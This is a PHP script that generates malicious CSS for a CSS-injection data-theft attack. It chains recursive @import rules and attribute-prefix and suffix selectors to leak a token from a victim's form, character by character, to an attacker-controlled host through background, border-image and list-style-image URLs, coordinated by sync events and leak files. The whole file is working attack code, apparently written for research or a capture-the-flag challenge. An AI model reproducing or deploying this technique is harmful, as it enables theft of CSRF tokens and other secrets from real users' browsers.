<?php
    header("Content-Type: text/css"); 
    require_once('config.php');

    // Stop the recursive import if token has leaked
    $leakTokenFile = 'leakToken.txt';
    if(file_exists($leakTokenFile)) {
        // Stop import and do nothing
    }
    else {
        // Chars in targeted token
        $alphabet = array(
            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
            '0','1','2','3','4','5','6','7','8','9',
            '_','-'
        );

        // No sync event for the first import (len=0)
        // Wait for the char leak event
        if(isset($_GET['len']) && intval($_GET['len'] > 0)) {
            $syncIdFile = 'sync-id.txt';
            $event = new SyncEvent(file_get_contents($syncIdFile));
            $event->wait(10000);
        }

        // Import the next css style to kean the next char
        echo '@import url(' . LHOST . LURL_NEXT . '?len=' . ++$_GET["len"] . '&name=' . $_GET["name"] . ');';

        // Read leak prechars from file
        $preCharsFile = 'pre.txt';
        if(file_exists($preCharsFile)) {
            $preChars = file_get_contents($preCharsFile);
        }
        else {
            $preChars = "";
        }

        // Create the next CSS selectors
        // We can use form:has because recursive import works only on Chrome
        foreach($alphabet as $char) {       
            if(isset($_GET[''])) {

            }     
            echo '
                form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value^="' . $preChars . $char . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
                    background:url(' . LHOST . LURL_LEAK . '?pre=' . $preChars . $char . ');
                }
            ';
        }

        // Read leak prechars from file
        $postCharsFile = 'post.txt';
        if(file_exists($postCharsFile)) {
            $postChars = file_get_contents($postCharsFile);
        }
        else {
            $postChars = "";
        }

        // Create the next CSS selectors
        // We can use form:has because recursive import works only on Chrome
        foreach($alphabet as $char) {            
            echo '
                form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value$="' . $char . $postChars . '"])' . str_repeat(":first-child", $_GET['len'])  . ' {
                    border-image:url(' . LHOST . LURL_LEAK . '?post=' . $char . $postChars . ');
                }
            ';
        }

        // Check if all the chars from the token are leaked
        // And check if the token has an odd number of characters
        echo '
            form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value="' . $preChars . ltrim($postChars, $postChars[0]) . '"]) {
                list-style-image:url(' . LHOST . LURL_LEAK . '?token=' . $preChars . ltrim($postChars, $postChars[0]) . ');
            }
        ';
        echo '
            form:has(' . HTML_ELEMENT_NAME . '[' . HTML_ATTRIBUTE_NAME . '=' . $_GET['name'] . '][value="' . $preChars . $postChars . '"]) {
                list-style-image:url(' . LHOST . LURL_LEAK . '?token=' . $preChars . $postChars . ');
            }
        ';
    }
?>